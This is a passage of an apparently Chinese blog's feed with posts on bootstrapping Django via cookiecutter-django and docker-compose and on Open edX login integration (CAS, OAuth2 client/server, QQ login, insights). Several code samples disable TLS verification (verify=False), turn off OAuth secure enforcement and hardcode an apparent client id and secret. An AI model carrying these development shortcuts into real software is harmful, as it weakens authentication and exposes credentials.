&lt;li&gt;docker-compose -f dev.yml run django python manage.py createsuperuser&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;映射关系&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;8000端口&lt;/li&gt;
&lt;li&gt;目录映射，项目根目录（./）映射到restserver_django的/app （可以使用docker exec -it xxx bash进入）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python env&lt;/h3&gt;
&lt;p&gt;在restserver_django中，以root的pip安装&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;requirements/base.txt&lt;/li&gt;
&lt;li&gt;requirements/local.txt&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django settings&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;默认是local（manage.py中指定）&lt;/li&gt;
&lt;li&gt;config/settings/local.py&lt;ul&gt;
&lt;li&gt;导入config/settings/common.py&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;数据库&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;DATABASES = {
    # Raises ImproperlyConfigured exception if DATABASE_URL not in os.environ
    &amp;#39;default&amp;#39;: env.db(&amp;#39;DATABASE_URL&amp;#39;, default=&amp;#39;postgres:///rest_server&amp;#39;),
}
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;一些有用的命令&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;docker-compose --help&lt;/li&gt;
&lt;li&gt;docker-compose logs&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;开发笔记&lt;/h1&gt;
&lt;h3&gt;migrate&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;docker-compose -f dev.yml run django python manage.py makemigrationsposts posts&lt;/li&gt;
&lt;li&gt;docker-compose -f dev.yml run django python manage.py migrate posts&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/tomchristie/django-rest-framework"&gt;django-rest-framework&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;token 直接用&lt;a href="http://www.django-rest-framework.org/api-guide/authentication/"&gt;TokenAuthentication&lt;/a&gt;,在代码里创建就行&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/agconti/cookiecutter-django-rest"&gt;cookiecutter-django-rest&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CORS&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ottoyiu/django-cors-headers"&gt;django-cors-headers&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;源码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/django-startup"&gt;django-startup&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/pydanny/cookiecutter-django"&gt;cookiecutter-django&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://cookiecutter-django.readthedocs.org/en/latest/developing-locally-docker.html"&gt;developing-locally-docker&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 16 Apr 2016 00:00:00 +0000</pubDate><guid>tag:,2016-04-16:use-cookiecutter-django-to-startup-django-project.html</guid><category>python</category></item><item><title>Tracking Logs 中的事件(翻译)</title><link>/events-in-the-tracking-logs.html</link><description>&lt;p&gt;翻译自：&lt;a href="http://edx.readthedocs.org/projects/devdata/en/latest/internal_data_formats/tracking_logs.html"&gt;Events in the Tracking Logs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;由&lt;code&gt;@ryseven&lt;/code&gt;翻译 , &lt;code&gt;@OVER&lt;/code&gt;校对和整理 ， &lt;code&gt;@wwj718&lt;/code&gt;参与部分校对&lt;/p&gt;
&lt;p&gt;项目仍在进行中，欢迎参与，译文参见 ：&lt;a href="http://blog.just4fun.site/others/tracking_logs_zh.rst.htm"&gt;Tracking Logs 中的事件&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Tracking Logs是Open edX的事件日志&lt;/p&gt;
&lt;p&gt;关于Tracking Logs我写过两篇文章，有兴趣的同学可以参考：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/edx-tracking-logs-data-research.html"&gt;基于tracking logs的数据分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/explore-Open-edX-tracking-system.html"&gt;explore Open edX tracking system&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;理解Open edX的Tracking Logs和Tracking System是分析edx数据的核心所在，也是先行条件&lt;/p&gt;
&lt;p&gt;当前的大数据分析，大多以日志为中心。关于这点可以参考&lt;a href="http://blog.jobbole.com/89674/"&gt;The Log：每个程序员都应该知道有关实时数据的统一抽象&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;对日志文件的理解，可能是理解分布式和大数据的入口。&lt;/p&gt;
&lt;p&gt;就Open edx而言也是这样，如果打算挖掘教育相关的数据，理解日志是绕不开的一步，所以我们对官方文档进行了翻译，也分享出来，希望对数据有兴趣的朋友有用&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 13 Apr 2016 00:00:00 +0000</pubDate><guid>tag:,2016-04-13:events-in-the-tracking-logs.html</guid><category>edx</category></item><item><title>Open edX各种登录方式探索</title><link>/Open-edX-login-explore.html</link><description>&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;对异构系统的整合是我的兴趣之一，Open edX的开放式设计使它很容易与其他系统整合，其中包括用户系统的整合&lt;/p&gt;
&lt;p&gt;前前后后折腾了edx的各种登录和注册机制，在此理一下。前几天对&lt;a href="https://github.com/omab/python-social-auth"&gt;python-social-auth&lt;/a&gt;做了探索，也一并做下笔记&lt;/p&gt;
&lt;p&gt;主要内容包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CAS&lt;/li&gt;
&lt;li&gt;OAuth2&lt;ul&gt;
&lt;li&gt;OAuth2 client&lt;/li&gt;
&lt;li&gt;OAuth2 server&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;更改login机制，同时支持username/email登录&lt;/li&gt;
&lt;li&gt;QQ/微信登录&lt;/li&gt;
&lt;li&gt;移动端跳转&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;CAS&lt;/h1&gt;
&lt;p&gt;关于CAS，我此前有写过一篇文章&lt;a href="http://blog.just4fun.site/use-CAS-in-your-LMS.html"&gt;为什么CAS应该成为你的LMS的一部分&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上边文章介绍了CAS的使用场景和它的原理，也给出了一些参考资料，对CAS不熟悉的小伙伴可以参考&lt;/p&gt;
&lt;p&gt;看到这里就假设你基本弄懂CAS的原理啦，那我们直接讨论如何将CAS和edx对接&lt;/p&gt;
&lt;p&gt;@MT说edx内置的cas client坑比较多，所以我试着改造了&lt;a href="https://github.com/kstateome/django-cas"&gt;django-cas&lt;/a&gt;,这是改造后的：&lt;a href="https://github.com/wwj718/django-cas"&gt;wwj718/django-cas&lt;/a&gt;，按照项目主页的引导，你就可以直接在Open edX里使用cas啦&lt;/p&gt;
&lt;p&gt;具体的实现可以参考我的commit，代码很短，就几行&lt;/p&gt;
&lt;h1&gt;OAuth2&lt;/h1&gt;
&lt;p&gt;关于OAuth2的学习可以参考我的笔记：&lt;a href="http://blog.just4fun.site/OAuth2-note.html"&gt;OAuth学习笔记&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你对此熟悉 ，我们继续前进&lt;/p&gt;
&lt;p&gt;CAS登录中，有一个中心，这个中心是CAS server，这种登录方式往往是集中式的。而OAuth2可以用于分布式登录的场景，尽管它的用途不只于此（还包括访问受限的资源）。&lt;/p&gt;
&lt;p&gt;你一定使用过这种登录方式，许多网站都支持支持QQ/微信/google/facebook登录&lt;/p&gt;
&lt;p&gt;这便使用了OAuth2&lt;/p&gt;
&lt;h3&gt;OAuth2 client&lt;/h3&gt;
&lt;p&gt;当我们访问网站A（比如我们的edx实例）时，使用了QQ登录，那么有以下事件发生&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户访问A网站，选择QQ登录，网站将用户导向qq认证服务器。&lt;/li&gt;
&lt;li&gt;用户登录QQ，并选择是否给予网站A授权。&lt;/li&gt;
&lt;li&gt;若用户给予授权，QQ认证服务器将用户导向A网站事先指定的"重定向URI"（redirection URI），同时附上一个授权码。&lt;/li&gt;
&lt;li&gt;A网站收到授权码，附上早先的"重定向URI"，向QQ认证服务器申请令牌。这一步是在A网站的后台的服务器上完成的，对用户不可见。&lt;/li&gt;
&lt;li&gt;QQ认证服务器核对了授权码和重定向URI，确认无误后，向A网站发送访问令牌（access token）和更新令牌（refresh token）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之后A网站在后端携带用户的access token，可能拿到用户资料了。至此A网站的后端可以知道用户A是否是A 网站的合法用户，对于采用QQ登录网站A而言，已经足够了。&lt;/p&gt;
&lt;p&gt;如果你熟悉OAuth2，你会发现这就是使用最广泛的&lt;code&gt;授权码模式&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;需要注意的是，本地用户系统如何与用户QQ资料挂钩，诸如展示用户名或者用户头像，这些不是oauth2该做的，即便走通了oauth2的流程只意味着，该用户在QQ认证服务器那边是合法用户，同时本地后台也可以拿到用户资料（QQ昵称/头像），可是如何把用户昵称和头像与网站A本地系统整合，好比username和昵称挂钩，或是与id挂钩，这需要在网站A注册系统里手写逻辑，一般在上边的最后一步做，注册完成之后，把用户重定向到dashboard。可以参考edx中既有的google/facebook/linkedin&lt;/p&gt;
&lt;p&gt;你也可以参考这个案例:&lt;a href="https://github.com/joestump/python-oauth2/wiki/Logging-into-Django-w--Twitter"&gt;Logging-into-Django-w--Twitter&lt;/a&gt;,尽管这个案例和edx无关，但它基本把流程说清了&lt;/p&gt;
&lt;p&gt;值得一提的事，edx整合外部登录到系统里的方式是采用用户绑定而不是直接注册，所以会导致以下问题&lt;/p&gt;
&lt;p&gt;如果你使用&lt;a href="https://github.com/omab/python-social-auth"&gt;python-social-auth&lt;/a&gt;，即便你好不容易，折腾半天，感觉已经没问题了，腾讯那边还会说&lt;code&gt;点击QQ登录按钮提示登录失败或出现错误信息（无跳转、提示失败、出现错误信息）&lt;/code&gt;,于是不让你审核通过，原因是edx的&lt;code&gt;third_party_auth&lt;/code&gt;并不会自动将oauth2登录通过的用户注册到edx里，而是要求你使用edx既有用户绑定一下，之后才可以使用qq登录。&lt;/p&gt;
&lt;p&gt;这样一来腾讯那边认为你并没有登录成功，所以没法审核通过&lt;/p&gt;
&lt;p&gt;以上是Open edx使用OAuth2 client登录qq的场景&lt;/p&gt;
&lt;p&gt;最后需要郑重提醒的是网站基本信息里回调地址得是&lt;code&gt;http:xxx/auth/complete/qq/&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;OAuth2 server&lt;/h3&gt;
&lt;p&gt;lms的 OAuth2 server 用的是&lt;a href="https://django-oauth2-provider.readthedocs.org/en/latest/getting_started.html"&gt;django-oauth2-provider&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下边我们讨论Open edX作为OAuth2 server的场景，这时Open edx相当于我们上边提到的QQ认证服务器的角色，此时B网站就可以使用Open edx的用户登录他们的网站，诸如insights就是这样做的，insights本身是个独立完整的网站，为了与lms/cms整合在一起，采用了OAuth2来关联用户，这时候lms就扮演了OAuth2 server的角色，只要你拥有lms的用户，就可以直接登录insights，用户的感觉是只有一个用户系统。&lt;/p&gt;
&lt;p&gt;整个认证的流程和上边基本相同，具体的操作可以参考&lt;a href="https://openedx.atlassian.net/wiki/display/OpenOPS/edX+Analytics+Installation"&gt;edX Analytics Installation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;不同的地方主要是OAuth2 server（lms）和OAuth2 client(insights)都是自己的，所以OAuth2 client是受信任的client，这是一种&lt;code&gt;客户端模式&lt;/code&gt;，比前头提到的授权码模式来得简单，关于这些模式的对比，可以参考我的这篇文章:&lt;a href="http://blog.just4fun.site/OAuth2-note.html"&gt;OAuth学习笔记&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;关于客户端模式的代码，参考&lt;a href="http://blog.just4fun.site/edx-api.html"&gt;enable Open edX REST APIs(work with mobile)&lt;/a&gt;,通过客户端模式，我们可以轻易了解用户和密码的正确性&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests.auth&lt;/span&gt;
&lt;span class="n"&gt;client_auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPBasicAuth&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;dc107056a5335b3a7c74&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;4e3f1fad6e0583fc80d78541f2ca6cfad8a93bed&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;post_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;grant_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;https://127.0.0.1/oauth2/access_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;client_auth&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;post_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;产生受信任客户端的核心就是我们能控制OAuth2 server，在其中执行：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo /edx/bin/python.edxapp /edx/bin/manage.edxapp lms --setting=aws create_oauth2_client http://insight:18110 http://insight:18110/complete/edx-oidc/ confidential --client_name insights --client_id YOUR_OAUTH2_KEY --client_secret secret --trusted&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;code&gt;http://insight:18110/complete/edx-oidc/&lt;/code&gt;是回调地址，这一步往往是两个平台用户关联的核心所在，有兴趣的同学可以直接翻源码，出于篇幅限制，在此不详述。这个url，来自&lt;a href="https://github.com/omab/python-social-auth"&gt;python-social-auth&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里给我们的一个启示是：如果你想拓展edx，所做的拓展并不需要再界面上与edx整合（内嵌的整合可以用djangoapp/xblock），而又希望两者能看起来像一个系统（用户打通），那么采用insights的这种架构就很好，实际上，open edx的整个项目就是由若干服务组成的，edx本身的就够就是由若干异构系统拼成的，这个今天人气很高的&lt;code&gt;微服务&lt;/code&gt;有异曲同工之处&lt;/p&gt;
&lt;p&gt;顺便再提一下，insights中有许多地方需要lms的数据，诸如题目统计里需要统计各类题目的正误情况，所以我们需要题目的信息，而这些信息insights里是不包括的，实际上这也是通过rest接口完成的，认证机制也是OAuth2，接口在这里&lt;a href="http://edx.readthedocs.org/projects/edx-platform-api/en/latest/course_structure/index.html"&gt;Course Structure API&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;回到OAuth2 server的话题，lms作为OAuth2 server，我们首先需要启动它，通过在&lt;code&gt;lms.env.json&lt;/code&gt;里设置(FEATURES)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;...
&amp;quot;FEATURES: {
    ...
    &amp;quot;ENABLE_OAUTH2_PROVIDER&amp;quot;: true,
    &amp;quot;OAUTH_ENFORCE_SECURE&amp;quot;: false,
    ...
}
&amp;quot;JWT_ISSUER&amp;quot;: &amp;quot;http://LMS/oauth2&amp;quot;,
&amp;quot;OAUTH_OIDC_ISSUER&amp;quot;: &amp;quot;http://LMS/oauth2&amp;quot;,
&amp;quot;OAUTH_ENFORCE_SECURE&amp;quot;: false, #这个放在FEATURES里？
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;而在insight里,确保&lt;code&gt;/edx/etc/insights.yml&lt;/code&gt;（如果跑脚本的时候设置正确，这些会自动生成）&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;CMS_COURSE_SHORTCUT_BASE_URL: http://LMS/course
COURSE_API_URL: http://LMS/api/course_structure/v0/
MODULE_PREVIEW_URL: http://LMS/xblock
SOCIAL_AUTH_EDX_OIDC_URL_ROOT: http://LMS/oauth2
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;外部登录细节&lt;/h3&gt;
&lt;p&gt;我们从insights开始，我们把insights看做一个oauth2 client，登录入口为&lt;code&gt;/accounts/login/&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    url(r&amp;#39;^accounts/login/$&amp;#39;,
        RedirectView.as_view(url=reverse_lazy(&amp;#39;social:begin&amp;#39;, args=[&amp;#39;edx-oidc&amp;#39;]), permanent=False, query_string=True),
        name=&amp;#39;login&amp;#39;),
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;通信的过程是标准的oauth2登录方式，具体的请求地址可以参考：&lt;a href="https://github.com/edx/auth-backends"&gt;auth-backends&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;a href="https://github.com/edx/auth-backends/blob/master/auth_backends/backends.py#L13"&gt;EdXOpenIdConnect&lt;/a&gt;是关键所在&lt;/p&gt;
&lt;p&gt;相关请求url为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AUTHORIZATION_URL :  http://LMS/oauth2/authorize/     //使用get获取code,有时效性&lt;/li&gt;
&lt;li&gt;ACCESS_TOKEN_URL : http://LMS/oauth2/access_token/    //使用post 携带参数获得access_token&lt;/li&gt;
&lt;li&gt;USER_INFO_URL : http://LMS/oauth2/user_info/&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们可以试试手动获取用户数据&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# get access_token&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests.auth&lt;/span&gt;
&lt;span class="n"&gt;client_auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPBasicAuth&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;key&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;secret&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;post_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;grant_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://LMS/oauth2/access_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;client_auth&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;post_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Authorization&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bearer xxx&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;User-Agent&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ChangeMeClient/0.1 by YourUsername&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http:/LMS/api/mobile/v0.5/my_user_info&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;以上采用的是受信任客户端的模式&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;这一块的单步调试非常错综复杂，是应为oauth2的url部分写得奇蠢无比。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FEATURES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ENABLE_OAUTH2_PROVIDER&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;urlpatterns&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="c1"&gt;# These URLs dispatch to django-oauth-toolkit or django-oauth2-provider as appropriate.&lt;/span&gt;
        &lt;span class="c1"&gt;# Developers should use these routes, to maintain compatibility for existing client code&lt;/span&gt;
        &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;^oauth2/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;lms.djangoapps.oauth_dispatch.urls&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
        &lt;span class="c1"&gt;# These URLs contain the django-oauth2-provider default behavior.  It exists to provide&lt;/span&gt;
        &lt;span class="c1"&gt;# URLs for django-oauth2-provider to call using reverse() with the oauth2 namespace, and&lt;/span&gt;
        &lt;span class="c1"&gt;# also to maintain support for views that have not yet been wrapped in dispatch views.&lt;/span&gt;
        &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;^oauth2/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;edx_oauth2_provider.urls&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;namespace&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;oauth2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt; 
        &lt;span class="c1"&gt;# The /_o/ prefix exists to provide a target for code in django-oauth-toolkit that&lt;/span&gt;
        &lt;span class="c1"&gt;# uses reverse() with the &amp;#39;oauth2_provider&amp;#39; namespace.  Developers should not access these&lt;/span&gt;
        &lt;span class="c1"&gt;# views directly, but should rather use the wrapped views at /oauth2/&lt;/span&gt;
        &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;^_o/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;oauth2_provider.urls&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;namespace&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;oauth2_provider&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;官方采取了url覆盖的方法，而不是明确指出，以至于你如果不深入源码丛林就找不到url对应的view，而由于这些是外部库，所以ack也很不方便&lt;/p&gt;
&lt;p&gt;我们只好求助一些工具: &lt;code&gt;sudo /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms show_urls  --settings devstack | grep user_info&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/api/mobile/v0.5/my_user_info   rest_framework.decorators.my_user_info
/oauth2/user_info/      oauth2_provider.views.UserInfoView      oauth2:user_info
&lt;/pre&gt;&lt;/div&gt;


